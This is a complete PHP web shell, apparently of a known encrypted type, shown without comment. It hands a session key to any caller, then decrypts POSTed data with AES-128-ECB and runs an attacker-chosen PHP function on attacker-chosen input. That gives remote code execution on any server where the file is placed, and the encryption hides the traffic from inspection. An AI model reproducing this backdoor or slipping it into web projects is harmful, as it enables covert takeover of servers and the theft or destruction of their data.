<?php
session_start();
if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else
{
    $key=$_SESSION['k'];
	$decrptContent=openssl_decrypt(file_get_contents("php://input"), "AES-128-ECB", $key);
	$arr=explode('|',$decrptContent);
	$func=$arr[0];
	$params=$arr[1];
    $func($params);
}
?>